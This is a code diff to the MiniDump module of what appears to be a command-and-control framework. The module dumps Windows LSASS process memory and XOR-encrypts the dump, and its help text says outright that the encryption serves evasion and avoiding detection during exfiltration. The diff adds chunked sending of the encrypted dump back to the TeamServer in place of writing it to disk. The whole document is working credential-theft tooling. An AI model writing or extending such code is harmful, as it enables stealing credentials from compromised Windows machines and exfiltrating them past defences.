@@ -1,7 +1,9 @@
 #include "MiniDump.hpp"
 
+#include <algorithm>
 #include <cstring>
 #include <array>
+#include <utility>
 #include <vector>
 
 #ifdef _WIN32
@@ -23,6 +25,7 @@ using namespace std;
 
 constexpr std::string_view moduleName = "miniDump";
 constexpr unsigned long long moduleHash = djb2(moduleName);
+constexpr std::size_t CHUNK_SIZE = 1 * 1024 * 1024;
 
 
 #ifdef _WIN32
@@ -190,16 +193,16 @@ std::string MiniDump::getInfo()
     std::string info;
 #ifdef BUILD_TEAMSERVER
     info += "MiniDump Module:\n";
-    info += "This module allows you to dump the LSASS process memory and output it as a file that is XOR-encrypted for evasion purposes.\n";
-    info += "The XORed dump file will be saved in the current directory. You can then decrypt it, once downloaded in the TeamServer, using the 'decrypt' command.\n\n";
+    info += "Dump the LSASS process memory and return it as an XOR-encrypted generated TeamServer artifact.\n";
+    info += "The XORed dump can then be decrypted locally with the decrypt action.\n\n";
     info += "Usage:\n";
-    info += "  miniDump dump dmpFile.xored\n";
-    info += "      - Dumps LSASS memory to an XOR-encrypted file (e.g., ./dmpFile.xored)\n\n";
+    info += "  miniDump dump [artifactName]\n";
+    info += "      - Dumps LSASS memory to an XOR-encrypted generated artifact (e.g., lsass.xored)\n\n";
     info += "  miniDump decrypt <path_to_xored_dump>\n";
     info += "      - Decrypts the specified XORed dump file for analysis (e.g., miniDump decrypt /tmp/dmpFile.xored)\n\n";
     info += "Note:\n";
     info += "  - The dump file is XOR-encoded to avoid detection during exfiltration.\n";
-    info += "  - Use the 'decrypt' command locally after download to convert it back to a usable minidump.\n";
+    info += "  - Use the 'decrypt' command locally to convert it back to a usable minidump.\n";
 #endif
     return info;
 }
@@ -269,6 +272,42 @@ int MiniDump::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 #endif
     return 0;
+}
+
+int MiniDump::emitChunk(C2Message& c2RetMessage)
+{
+    if (m_dumpBuffer.empty() || m_bytesSent >= m_dumpBuffer.size())
+        return 0;
+
+    const std::size_t totalSize = m_dumpBuffer.size();
+    const std::size_t chunkSize = std::min(CHUNK_SIZE, totalSize - m_bytesSent);
+    c2RetMessage.set_instruction(std::to_string(moduleHash));
+    c2RetMessage.set_cmd("");
+    c2RetMessage.set_uuid(m_taskUuid);
+    c2RetMessage.set_outputfile(m_outputfile);
+    c2RetMessage.set_args(m_bytesSent == 0 ? "0" : "1");
+    c2RetMessage.set_data(m_dumpBuffer.data() + m_bytesSent, chunkSize);
+
+    m_bytesSent += chunkSize;
+    if (m_bytesSent == totalSize)
+    {
+        c2RetMessage.set_returnvalue("Success");
+        m_outputfile.clear();
+        m_taskUuid.clear();
+        m_dumpBuffer.clear();
+        m_bytesSent = 0;
+    }
+    else
+    {
+        c2RetMessage.set_returnvalue(std::to_string(m_bytesSent) + "/" + std::to_string(totalSize));
+    }
+
+    return 1;
+}
+
+int MiniDump::recurringExec(C2Message& c2RetMessage)
+{
+    return emitChunk(c2RetMessage);
 }
 
 
@@ -823,16 +862,11 @@ int MiniDump::process(C2Message &c2Message, C2Message &c2RetMessage)
 
         XOR(dumpfile, xorKey);
 
-        // Save to file
-        std::string dmpFileName = c2Message.outputfile();
-        bool writeOk = WriteStringToFile(dmpFileName, dumpfile);
-        if(!writeOk)
-        {
-            c2RetMessage.set_errorCode(ERROR_WRITE_OUTPUT_FILE);
-            return -1;
-        }
-
-        c2RetMessage.set_returnvalue("Success");
+        m_outputfile = c2Message.outputfile();
+        m_taskUuid = c2Message.uuid();
+        m_dumpBuffer = std::move(dumpfile);
+        m_bytesSent = 0;
+        emitChunk(c2RetMessage);
         return 0;
     }
     
